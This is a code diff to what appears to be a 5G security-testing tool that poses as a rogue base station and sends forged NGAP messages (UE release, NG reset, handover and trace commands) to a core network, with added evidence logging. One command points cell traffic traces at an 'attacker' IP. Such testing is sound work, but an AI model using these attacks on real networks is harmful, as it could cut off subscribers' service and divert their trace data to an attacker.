@@ -94,6 +94,27 @@ def _save(evidence, obj):
     print(f"[evidence] appended to {evidence}")
 
 
+def _listen_after(gnb, a, attack, seconds=4.0):
+    """Class-2 / fire-and-forget: stay on the assoc so an ErrorIndication is printed.
+
+    Black-box: if nothing comes back here, the verdict is in the N2 pcap and
+    the legit gNB/UE terminals — not in this process exiting immediately.
+    """
+    print(f"[{attack}] listening {seconds}s for AMF NGAP back to us ...")
+    seen = []
+
+    def on_msg(pdu):
+        mt = ngap.message_type(pdu)
+        seen.append(mt)
+        print(f"[{attack}]   << {ngap.summarize(pdu)}")
+        _save(a.evidence, {"attack": attack, "result": mt,
+                           "summary": ngap.summarize(pdu)})
+
+    gnb.listen(seconds, on_msg)
+    if not seen:
+        print(f"[{attack}]   (no NGAP to us — look at N2 pcap and terminal A)")
+
+
 def cmd_ue_release(gnb, a):
     r = gnb.send(B.ue_context_release_request(a.amf_ue_id, a.ran_ue_id))
     print(f"[ue-release] amf={a.amf_ue_id} ran={a.ran_ue_id} -> "
@@ -108,6 +129,12 @@ def cmd_error_indication(gnb, a):
     r = gnb.send(B.error_indication(a.amf_ue_id, a.ran_ue_id))
     print(f"[error-indication] amf={a.amf_ue_id} ran={a.ran_ue_id} -> "
           f"{ngap.summarize(r) if r else '(no reply to us)'}")
+    _save(a.evidence, {"attack": "error-indication",
+                       "amf_ue_id": a.amf_ue_id,
+                       "ran_ue_id": a.ran_ue_id,
+                       "result": ngap.message_type(r) if r else None})
+    if r is None:
+        _listen_after(gnb, a, "error-indication")
 
 
 def cmd_ng_reset(gnb, a):
@@ -119,6 +146,10 @@ def cmd_ng_reset(gnb, a):
         pairs.append((int(bits[0]), int(bits[1]) if len(bits) > 1 else None))
     r = gnb.send(B.ng_reset_partial(pairs))
     print(f"[ng-reset] targets={pairs} -> {ngap.summarize(r) if r else '(no reply)'}")
+    _save(a.evidence, {"attack": "ng-reset", "targets": pairs,
+                       "result": ngap.message_type(r) if r else None})
+    if r is None:
+        _listen_after(gnb, a, "ng-reset")
 
 
 def cmd_initial_ue(gnb, a):
@@ -322,28 +353,38 @@ def cmd_ho_window_inject(gnb, a):
 
 def cmd_pdu_notify(gnb, a):
     gnb.send(B.pdu_session_resource_notify(a.amf_ue_id, a.ran_ue_id), wait=False)
-    print(f"[pdu-notify] amf={a.amf_ue_id} sent (Class-2, no direct reply)")
+    print(f"[pdu-notify] amf={a.amf_ue_id} sent (Class-2)")
+    _save(a.evidence, {"attack": "pdu-notify", "amf_ue_id": a.amf_ue_id})
+    _listen_after(gnb, a, "pdu-notify")
 
 
 def cmd_handover_notify(gnb, a):
     gnb.send(B.handover_notify(a.amf_ue_id, a.ran_ue_id, gnb.cfg), wait=False)
     print(f"[handover-notify] amf={a.amf_ue_id} sent (Class-2)")
+    _save(a.evidence, {"attack": "handover-notify", "amf_ue_id": a.amf_ue_id})
+    _listen_after(gnb, a, "handover-notify")
 
 
 def cmd_nrppa(gnb, a):
     gnb.send(B.uplink_ue_associated_nrppa_transport(a.amf_ue_id, a.ran_ue_id), wait=False)
     print(f"[ul-nrppa] amf={a.amf_ue_id} sent (Class-2)")
+    _save(a.evidence, {"attack": "ul-nrppa", "amf_ue_id": a.amf_ue_id})
+    _listen_after(gnb, a, "ul-nrppa")
 
 
 def cmd_cell_trace(gnb, a):
     ip = resolve_attacker_ip(gnb.cfg, a)
     gnb.send(B.cell_traffic_trace(a.amf_ue_id, a.ran_ue_id, gnb.cfg, tce_ip=ip), wait=False)
     print(f"[cell-trace] amf={a.amf_ue_id} tce-ip={ip} sent (Class-2)")
+    _save(a.evidence, {"attack": "cell-trace", "amf_ue_id": a.amf_ue_id, "tce_ip": ip})
+    _listen_after(gnb, a, "cell-trace")
 
 
 def cmd_ran_status(gnb, a):
     gnb.send(B.uplink_ran_status_transfer(a.amf_ue_id, a.ran_ue_id), wait=False)
     print(f"[ul-ran-status] amf={a.amf_ue_id} sent (Class-2)")
+    _save(a.evidence, {"attack": "ul-ran-status", "amf_ue_id": a.amf_ue_id})
+    _listen_after(gnb, a, "ul-ran-status")
 
 
 def cmd_ran_config_update(gnb, a):
